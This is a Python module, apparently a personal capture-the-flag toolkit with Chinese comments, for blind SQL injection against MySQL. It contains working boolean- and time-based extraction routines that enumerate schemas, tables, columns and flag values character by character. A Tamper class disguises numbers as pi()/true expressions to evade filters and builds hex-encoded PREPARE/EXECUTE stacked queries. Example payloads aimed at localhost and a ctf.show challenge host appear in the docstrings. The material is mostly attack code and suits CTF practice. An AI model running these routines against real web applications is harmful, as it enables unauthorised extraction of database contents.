import datetime
import requests
import re as regx
from urllib.parse import quote
from utfc.StrFunc import  printbi,printc,cmd_color
Alphabet = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'j', 'h', 'i', 'g', 'k',
            'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
            'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '?',
            '!', ',', '|', '[', ']', '{', '}', '/', '*', '-', '+', '&', "%", '#', '@', '$', '~', '_', ]
from utfc.StaticValue import AlphabetLike  as alike
Alphex = '0123456789abcdeflg{}-'
''' 盲注
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - Time例子如下- - - - - - - - - - - - - - - - - - - - - - - - -
def Timechk(pl):
    urlb='http://localhost/?id=1"or({})and"a"="a'
    datetime.datetime.now()
    requests.get(url.format('if(({}),sleep(2),false)'),timeout=10)
    end=datetime.datetime.now()-start
    return end.seconds>=2
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - Boolchk例子如下 - - - - - - - - - - - - - - - - - - - - - - - 
def chk(pl):
    urlb='http://localhost/?id=1"and({})and"a"="a'
    up=urlb.format(pl)
    return  len(requests.get(up).text) <745

# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - pl例子如下- - - - - - - - - - - - - - - - - - - - - - - - - -
import utfc.SqliF as sf
import utfc.StaticValue as stv
#爆用户
p1 = 'select length(group_concat(SCHEMA_NAME))={} from information_schema.SCHEMATA'
p2 = 'select group_concat(SCHEMA_NAME) like "{}%"  from information_schema.SCHEMATA'
#爆表
p3 = 'select length(group_concat(table_name))={} from information_schema.tables where table_schema="ctfshow_web"'
p4 = 'select group_concat(table_name)  like "{}%"  from information_schema.tables where table_schema="ctfshow_web"'
#爆字段
p5 = 'select length(group_concat(column_name))={}  from information_schema.columns where table_name="flag233333"'
p6 = 'select  group_concat(column_name) like "{}%" from information_schema.columns where table_name="flag233333"'
#getflag
p7 = 'select length(group_concat(flagass233))={}  from flag233333'
p8 = 'select group_concat(flagass233) like "{}%" from flag233333'
sf.BoolBi_like(chk,p7,p8,stv.AlphabetLike)
# - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
'''
def BoolBi(chk,pl1="",pl2="",abl=Alphabet,start='',startn=1):
    print(chk('1=0'), chk('1=1'))
    l=500
    for i in range(startn,200):
        pl=pl1.format(i)
        print(i,end=' ')
        if chk(pl):
            l=i
            break
    print()
    print('- '*60)
    printc('Length:%d'%l,cmd_color.light_green)

    strx = start
    for i in range(len(start)+1,l+1):
        printbi(i,strx,l+5)
        for j in abl:
            pl=pl2.format(i,j)
            print(j,end='')
            if chk(pl):
                strx+=j
                break
    print()
    print('- '*60)
    printc('Data: %s' % strx.replace(',','  |'), cmd_color.light_green)
    print('- ' * 60)
    return strx

def BoolBi_n(chk,pl1="",pl2="",abl=Alphabet,start='',startn=1):
    print(chk('1=0'), chk('1=1'))
    l=500
    for i in range(startn,200):
        pl=pl1.format(i)
        print(i,end=' ')
        if chk(pl):
            l=i
            break
    print()
    print('- '*60)
    printc('Length:%d'%l,cmd_color.light_green)

    strx = start
    for i in range(len(start)+1,l+1):
        printbi(i,strx,l+5)
        for x in abl:
            if isinstance(x,str):
                j=ord(x)
            else :
                j = int(x)
            pl=pl2.format(i,j)
            print(chr(j),end='')
            if chk(pl):
                strx+=chr(j)
                break
    print()
    print('- '*60)
    printc('Data: %s' % strx.replace(',','  |'), cmd_color.light_green)
    print('- ' * 60)
    return strx

def BoolBi_like(chk,pl1="",pl2="",abl=alike,start='',startn=1):
    print(chk('1=0'), chk('1=1'))
    l=500
    for i in range(startn,200):
        pl=pl1.format(i)
        print(i,end=' ')
        if chk(pl):
            l=i
            break
    print()
    print('- '*60)
    printc('Length:%d'%l,cmd_color.light_green)

    strx = start
    for i in range(len(start),l+1):
        printbi(i,strx,l+5)
        for j in abl:
            pl=pl2.format(strx+j)
            print(j,end='')
            if chk(pl):
                strx+=j
                break
    print()
    print('- '*60)
    printc('Data: %s' % strx.replace(',','  |'), cmd_color.light_green)
    print('- ' * 60)
    return strx


class Tamper:
    numbers= {0: '(false)', 1: '(true)', 2: '(true+true)', 3: 'floor(pi())', 4: 'ceil(pi())', 5: 'ceil(pi()+true)', 6: 'floor(pi()+pi())', 7: 'ceil(pi()+pi())', 8: 'ceil(pi()+pi()+true)', 9: 'floor(pi()*pi())', 10: 'ceil(pi()*pi())',20: 'ceil(pi()*pi()*(true+true))', 30: '(ceil(pi()*pi())*floor(pi()))', 40: '(ceil(pi()*pi())*ceil(pi()))', 50: '(ceil(pi()*pi())*ceil(pi()+true))', 60: '(ceil(pi()*pi())*floor(pi()+pi()))', 70: '(ceil(pi()*pi())*ceil(pi()+pi()))', 80: '(ceil(pi()*pi())*ceil(pi()+pi()+true))', 90: '(ceil(pi()*pi())*floor(pi()*pi()))', 100: '(ceil(pi()*pi())*(ceil(pi()*pi()))', 110: '(ceil(pi()*pi())*(ceil(pi()*pi())))', 120: '(ceil(pi()*pi()+true+true)*(ceil(pi()*pi())))'}
    @staticmethod
    def num2tpi(num):  # 用 true false pi 表示数
        nums = ['(true)', '(true<<true)', '(true<<true<<true)', '(true<<pi())', '(true<<pi()<<true)',
                '(true<<pi()<<true<<true)', '(true<<(pi()<<true))', '(true<<pi()<<pi()<<true)'][::-1]
        x = format(num, '08b')
        ret = '((false)'
        for i in range(len(x)):
            if x[i] == '1':
                ret += '^'
                ret += nums[i]
        return ret + ')'

    @staticmethod
    def num2tpiNgl(num):  # 用 true false pi 表示

        # 数 木有<<
        nums = ['(true)', '(true+true)', 'pow(true+true,true+true)', 'pow(true+true,true+true+true)',
                'pow(true+true,ceil(pi()))', 'pow(true+true,ceil(pi()+true))', 'pow(true+true,ceil(pi()+true+true))',
                'pow(true+true,ceil(pi()+true+true+true))'][::-1]
        x = format(num, '08b')
        ret = '((false)'
        for i in range(len(x)):
            if x[i] == '1':
                ret += '+'
                ret += nums[i]
        return ret + ')'
    @staticmethod
    def CreatePrepare(pl='select 1', func='hex'):
        if func == 'str':
            ret = "PREPARE fucker from concat("
            for i in pl:
                ret += f"'{i}',"
            return ret[:-1] + ");EXECUTE fucker;"

        if 'char' == func:
            ret = "PREPARE fucker from concat(char("
            for i in pl:
                ret += f"{ord(i)},"
            return ret[:-1] + "));EXECUTE fucker;"

        if 'hex' == func:
            ret = 'PREPARE fucker from 0x'
            for i in pl:
                ret += '%02x' % ord(i)
            return ret + ';EXECUTE fucker;'





'''盲注的例子
import requests,json
url='http://0a7dcfc9-1ecb-4f53-8037-0a3073f7d091.chall.ctf.show/api/?id='
def chk(pl):
    data = {
        'username':'\'union({})#'.format(pl),
        'password':'1'
    }
    return '登陆成功' in json.loads(requests.post(url,data=data).text)['msg']
print(chk('select(1=1)'),chk('select(1>1)'))
Alphabet = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'j', 'h', 'i', 'g', 'k',
            'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
            'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '?',
            '!', ',', '|', '[', ']', '{', '}', '/', '*', '-', '+', '&', "%", '#', '@', '$', '~', '_', ]
table=''
def bi(pl='group_concat(table_name)',plf=' from information_schema.tables where table_schema=database()'):
    l=1
    while True:
        print(l,end=',')
        pl_gcd='select + length('+pl+')=%d '%l + plf
        if chk(pl_gcd) : break
        l+=1
    print('\nl=',l)
    ret=''
    for i in range (1,1+l):
        print('\n',format(ret,'%ds'%l),end='')
        for j in Alphabet:
            pl_gnr="select mid({},{},1)='{}' {}".format(pl,i,j,plf)
            print(j,end='')
            if(chk(pl_gnr)):
                ret+=j
                break
    print('\nret=', ret)
    return ret

'''

'''
带回显的盲注
pl1="select group_concat(SCHEMA_NAME)from information_schema.SCHEMATA"
pl2="select group_concat(table_name)from information_schema.tables where table_schema='ctfshow' "
pl3="select group_concat(column_name)from information_schema.columns where table_name='flag' "
pl4="select substring(group_concat(flag4),1,30) from ctfshow.flag"
pl5="select substring(group_concat(flag4),31,30) from ctfshow.flag"
'''
def err_echo_post(url,pl={},r = None,rend='</br>',headers=None,cookie=None):
    rt = requests.post(url,data=pl,headers=headers,cookies=cookie).text
    if r==None :
        return rt
    else:
        rtl = regx.findall(rf'{r}(.*?){rend}',rt)
        if len(rtl)==0:
            return rt
        else:
            return rtl